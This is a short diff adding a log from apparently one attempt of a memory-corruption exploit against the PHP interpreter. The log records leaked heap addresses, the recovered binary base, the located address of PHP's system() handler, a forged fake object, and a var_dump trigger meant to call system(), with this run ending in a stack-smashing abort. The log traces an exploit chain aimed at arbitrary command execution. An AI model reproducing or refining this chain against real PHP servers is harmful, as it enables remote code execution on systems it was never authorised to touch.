@@ -1,0 +1,11 @@
+=== attempt 1 (E: enum-autoload entry) ===
+M1 block2 = 0x7a2162499000
+M2 T_u5=0x7a21624ae060 T_u13=0x7a21624ae0e0 spacing=128
+M2 ORACLE1=0x6264b05fe460 ORACLE2=0x6264b05fe460
+M2-DONE base=0x6264af600000 zif_system=0x6264afb23c60
+M3-STR strlen=8160
+M3 string reclaim OK (canaries verified at block2)
+M3 BASE verified via ELF magic at BASE+0
+M3 forged: OBJ=0x7a2162499098 zif_system=0x6264afb23c60
+TRIGGER var_dump -> zif_system(fake_execute_data)
+*** stack smashing detected ***: terminated
